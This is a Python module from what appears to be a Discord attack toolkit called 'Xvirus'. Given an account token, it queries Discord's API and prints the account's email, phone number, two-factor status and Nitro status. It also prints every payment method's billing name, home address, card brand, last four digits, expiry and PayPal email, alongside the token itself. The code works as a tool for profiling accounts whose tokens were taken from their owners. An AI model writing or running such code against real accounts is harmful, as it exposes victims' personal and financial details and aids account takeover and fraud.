import requests
import Xvirus

from datetime import datetime
from colorama import Fore

from util.plugins.common import getheaders

def Info(token):
    r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
    cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
}
    badges = ""

    Discord_Employee = 1
    Partnered_Server_Owner = 2
    HypeSquad_Events = 4
    Bug_Hunter_Level_1 = 8
    House_Bravery = 64
    House_Brilliance = 128
    House_Balance = 256
    Early_Supporter = 512
    Bug_Hunter_Level_2 = 16384
    Early_Verified_Bot_Developer = 131072

    flags = r.json()['flags']
    if (flags == Discord_Employee):
        badges += "Staff, "
    if (flags == Partnered_Server_Owner):
        badges += "Partner, "
    if (flags == HypeSquad_Events):
        badges += "Hypesquad Event, "
    if (flags == Bug_Hunter_Level_1):
        badges += "Green Bughunter, "
    if (flags == House_Bravery):
        badges += "Hypesquad Bravery, "
    if (flags == House_Brilliance):
        badges += "HypeSquad Brillance, "
    if (flags == House_Balance):
        badges += "HypeSquad Balance, "
    if (flags == Early_Supporter):
        badges += "Early Supporter, "
    if (flags == Bug_Hunter_Level_2):
        badges += "Gold BugHunter, "
    if (flags == Early_Verified_Bot_Developer):
        badges += "Verified Bot Developer, "
    if (badges == ""):
        badges = "None"

    userName = r.json()['username'] + '#' + r.json()['discriminator']
    userID = r.json()['id']
    phone = r.json()['phone']
    email = r.json()['email']
    language = r.json()['locale']
    mfa = r.json()['mfa_enabled']
    avatar_id = r.json()['avatar']
    has_nitro = False
    res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=getheaders(token))
    nitro_data = res.json()
    has_nitro = bool(len(nitro_data) > 0)
    avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp'
    creation_date = datetime.utcfromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')

    if has_nitro:
        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        days_left = abs((d2 - d1).days)

    billing_info = []
    for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=getheaders(token)).json():
        y = x['billing_address']
        name = y['name']
        address_1 = y['line_1']
        address_2 = y['line_2']
        city = y['city']
        postal_code = y['postal_code']
        state = y['state']
        country = y['country']
        if x['type'] == 1:
            cc_brand = x['brand']
            cc_first = cc_digits.get(cc_brand)
            cc_last = x['last_4']
            cc_month = str(x['expires_month'])
            cc_year = str(x['expires_year'])
            data = {
                'Payment Type': 'Credit Card',
                'Valid': not x['invalid'],
                'CC Holder Name': name,
                'CC Brand': cc_brand.title(),
                'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                'Address 1': address_1,
                'Address 2': address_2 if address_2 else '',
                'City': city,
                'Postal Code': postal_code,
                'State': state if state else '',
                'Country': country,
                'Default Payment': x['default']
            }
        elif x['type'] == 2:
            data = {
                'Payment Type': 'PayPal',
                'Valid': not x['invalid'],
                'PayPal Name': name,
                'PayPal Email': x['email'],
                'Address 1': address_1,
                'Address 2': address_2 if address_2 else '',
                'City': city,
                'Postal Code': postal_code,
                'State': state if state else '',
                'Country': country,
                'Default Payment': x['default']
            }
        billing_info.append(data)
        
    print(f'''
    {Fore.RESET}{Fore.GREEN}<<────────────{userName}────────────>>{Fore.RESET}
    [{Fore.RED}User ID{Fore.RESET}]         {userID}
    [{Fore.RED}Created at{Fore.RESET}]      {creation_date}
    [{Fore.RED}Language{Fore.RESET}]        {language}
    [{Fore.RED}Badges{Fore.RESET}]          {badges}
    [{Fore.RED}Avatar URL{Fore.RESET}]      {avatar_url if avatar_id else ""}
    [{Fore.RED}Token{Fore.RESET}]           {token}
    {Fore.RESET}{Fore.GREEN}<───────────Security Info───────────>{Fore.RESET}
    [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
    [{Fore.RED}Email{Fore.RESET}]           {email}
    [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
    {Fore.RESET}{Fore.GREEN}<────────────Nitro Info─────────────>{Fore.RESET}
    [{Fore.RED}Nitro Status{Fore.RESET}]    {has_nitro}
    [{Fore.RED}Expires in{Fore.RESET}]      {days_left if has_nitro else "0"} day(s)
                ''')
    if len(billing_info) > 0:
        print(f"\t\t{Fore.RESET}{Fore.GREEN}<────────────Billing Info────────────>{Fore.RESET}")
        if len(billing_info) == 1:
            for x in billing_info:
                for key, val in x.items():
                    if not val:
                        continue
                    print(f"[{Fore.RED}"+'{:<23}{:<10}{}'.format(key+Fore.RED+Fore.RESET+"]", Fore.RESET, val))
        else:
            for i, x in enumerate(billing_info):
                title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                print('' + title)
                print('' + ('=' * len(title)))
                for j, (key, val) in enumerate(x.items()):
                    if not val or j == 0:
                        continue
                    print(f"[{Fore.RED}"+'{:<23}{:<10}{}'.format(key+Fore.RED+Fore.RESET+"]", Fore.RESET, val))
                if i < len(billing_info) - 1:
                    print(f'{Fore.RESET}\n')
        print(f'{Fore.RESET}')
    input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue . . .  {Fore.RED}')
    Xvirus.main()